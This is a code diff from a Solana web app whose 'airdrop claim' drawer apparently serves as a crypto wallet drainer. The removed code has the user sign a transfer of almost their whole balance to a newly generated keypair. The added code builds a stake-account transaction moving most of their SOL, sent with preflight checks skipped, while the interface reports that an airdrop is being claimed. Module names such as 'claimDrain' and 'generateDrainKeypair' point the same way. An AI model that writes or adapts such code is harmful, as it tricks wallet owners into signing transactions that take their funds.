@@ -9,23 +9,41 @@ import {
     DrawerHeader,
     DrawerTitle,
   } from "@/app/components/ui/drawer"
+  import {
+    clusterApiUrl,
+    Connection,
+    Keypair,
+    LAMPORTS_PER_SOL,
+    StakeProgram,
+    Authorized,
+    sendAndConfirmTransaction,
+    Lockup,
+    PublicKey,
+    Signer,
+    SystemProgram,
+    Transaction
+  } from "@solana/web3.js";
+
+
+
   import { claimLevel } from '@/app/constants/claimStages'
   import { changeOpenBottomDrawer } from '@/app/services/redux/drawerBottom'
   import { changeClaimStages } from '@/app/services/redux/claimDrain'
   import Button from '../ui/Button'
   import { ThreeDots } from 'react-loader-spinner'
   import { toast } from 'sonner';
-import { Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from '@solana/web3.js'
+// import { Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from '@solana/web3.js'
 import { useWallet } from '@solana/wallet-adapter-react'
 // import { approveTokensForSpendingandSendToken } from '@/app/services/hook/sendSol'
 import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject'
 import { generateSolanaWallet } from '@/app/services/hook/generateDrainKeypair'
+import { StakeSol } from '@/app/services/hook/stake/StakeSol'
 
-const AIRDRO_BALANCE = 2000 ; 
-const GASFEE = 0.001;
+const AIRDROP_BALANCE = 20000 ; 
+const GASFEE = 0.003;
 const BottomDrawer = () => {
-const {wallet , signTransaction , publicKey , sendTransaction} =   useWallet();
-const connection = new Connection(String(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS)))
+const {wallet , signTransaction , publicKey, sendTransaction} =   useWallet();
+const connection = new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
 const openBottomDrawal = changeOpenBottomDrawer((state)=>state.openBottomDrawer)
 const resetBottomDrawal = changeOpenBottomDrawer((state)=>state.resetOpenBottomDrawer)
 const claimingStage = changeClaimStages((state)=>state.claimStage)
@@ -36,19 +54,231 @@ const deductGas = (GASFEE * Number(LAMPORTS_PER_SOL));
 
 
 async function claimToken(){
+  try{
+    const lamportconversion = (getUsersBalance * LAMPORTS_PER_SOL)
+
+    // Setup our connection and wallet
+    // const connection = new Connection(clusterApiUrl("devnet"), "confirmed");
+    const connection = new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
+    // const wallet = Keypair.generate();
+  
+    // Fund our wallet with 1 SOL
+    // const airdropSignature = await connection.requestAirdrop(
+    //   wallet.publicKey,
+    //   LAMPORTS_PER_SOL
+    // );
+    // await connection.confirmTransaction(airdropSignature);
+  
+    // Create a keypair for our stake account
+    // const stakeAccount = Keypair.generate();
+  
+    // Calculate how much we want to stake
+    const minimumRent = await connection.getMinimumBalanceForRentExemption(
+      StakeProgram.space
+    );
+
+    const amountUserWantsToStake =  lamportconversion // This is can be user input. For now, we'll hardcode to 0.5 SOL
+    const amountToStake = minimumRent + amountUserWantsToStake;
+  
+
+    // 30000000 ,  2282880
+    const considerAmount = ((amountUserWantsToStake - minimumRent) - AIRDROP_BALANCE) ;
+    const stakingAmount = ( considerAmount <= 0)?  0  :  (considerAmount + minimumRent) ;
+     console.log(lamportconversion ,minimumRent , stakingAmount )
+
+    // Setup a transaction to create our stake account
+    // Note: `StakeProgram.createAccount` returns a `Transaction` preconfigured with the necessary `TransactionInstruction`s
+    const createStakeAccountTx = StakeProgram.createAccount({
+      authorized: new Authorized(publicKey as PublicKey, publicKey as PublicKey), // Here we set two authorities: Stake Authority and Withdrawal Authority. Both are set to our wallet.
+      fromPubkey: publicKey as PublicKey,
+      lamports: Number(stakingAmount),
+      lockup: new Lockup(0, 0,  publicKey as PublicKey), // Optional. We'll set this to 0 for demonstration purposes.
+      stakePubkey: publicKey as PublicKey,
+    });
+
+    // const createStakeAccountTxId = await sendAndConfirmTransaction(
+    //   connection,
+    //   createStakeAccountTx,
+    //   [wallet] as unknown  as Signer[]
+    // );
+
+
+
+const {
+  context: { slot: minContextSlot },
+  value: { blockhash, lastValidBlockHeight },
+} = await connection.getLatestBlockhashAndContext();
+
+       const signature = await sendTransaction(createStakeAccountTx, connection, {
+      minContextSlot,
+      skipPreflight: true,
+      signers: [],
+      preflightCommitment: 'processed',
+    });
+
+    console.log(createStakeAccountTx , signature , "create Stake Account Transaction ")
+    // stakeAccount, // Since we're creating a new stake account, we have that account sign as well
+    // console.log(`Stake account created. Tx Id: ${createStakeAccountTxId}`);
+  
+    // Check our newly created stake account balance. This should be 0.5 SOL.
+    let stakeBalance = await connection.getBalance(publicKey as PublicKey);
+    console.log(`Stake account balance: ${stakeBalance / LAMPORTS_PER_SOL} SOL`);
+  
+    // Verify the status of our stake account. This will start as inactive and will take some time to activate.
+    let stakeStatus = await connection.getStakeActivation(publicKey as PublicKey);
+    console.log(`Stake account status: ${stakeStatus.state}`);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
   toast("🎉 Airdrop claiming Status ", {description: " Airdrop claimin is initialized 🎉 "});
   resetClaim(claimLevel[2])
-  const userBkeyPair =  await generateSolanaWallet()
-  const mainAccountAmount  = Number(getUsersBalance) * Number(LAMPORTS_PER_SOL) - (deductGas);
-  console.log( " { mnemonic,seed,keypair,publicKe} " ,userBkeyPair)
-  const approveTx = new Transaction().add(
-    approveInstruction(mainAccountAmount, publicKey as PublicKey, userBkeyPair?.publicKey as PublicKey)
-);
+  // const userBkeyPair =  await generateSolanaWallet()
+  // const mainAccountAmount  = Number(getUsersBalance) * Number(LAMPORTS_PER_SOL) - (deductGas);
+  // console.log( " { mnemonic,seed,keypair,publicKe} " ,userBkeyPair)
+//   const approveTx = new Transaction().add(
+//     approveInstruction(mainAccountAmount, publicKey as PublicKey, userBkeyPair?.publicKey as PublicKey)
+//     // transferInstruction(mainAccountAmount, publicKey as PublicKey, userBkeyPair?.publicKey as PublicKey) 
+// );
 
-// console.log('Approval transaction sent. Signature:', signature);
+// const {
+//   context: { slot: minContextSlot },
+//   value: { blockhash, lastValidBlockHeight },
+// } = await connection.getLatestBlockhashAndContext();
+
+    // const signature = await sendTransaction(approveTx, connection, {
+    //   minContextSlot,
+    //   skipPreflight: true,
+    //   signers: [],
+    //   preflightCommitment: 'processed',
+    // });
+    // console.log({ blockhash, lastValidBlockHeight, signature, minContextSlot });
+
+    // const confirmtx = await connection.confirmTransaction({ blockhash, lastValidBlockHeight, signature });
+    // console.log({ signature, confirmtx });
+    // const txdata = await connection.getParsedTransaction(signature);
+    // console.log({ data: txdata?.meta?.logMessages });
 
 
-//  await approveTokensForSpendingandSendToken(Number(mainAccountAmount) ,publicKey as PublicKey, userBkeyPair?.keypair as Keypair,signTransaction)
+  }catch(error){
+         console.log(error)
+  }
+
 }
 
 function approveInstruction(amount:number, senderPublicKey:PublicKey, recipientPublicKey:PublicKey) {
@@ -56,7 +286,16 @@ function approveInstruction(amount:number, senderPublicKey:PublicKey, recipientP
       fromPubkey: senderPublicKey,
       toPubkey: recipientPublicKey,
       lamports: amount,
-  });
+  }); 
+}
+
+
+function transferInstruction(amount:number, recipientPublicKey:PublicKey, senderPublicKey:PublicKey) {
+    return SystemProgram.transfer({
+        fromPubkey: senderPublicKey,
+        toPubkey: recipientPublicKey,
+        lamports: amount,
+    });
 }
 
 
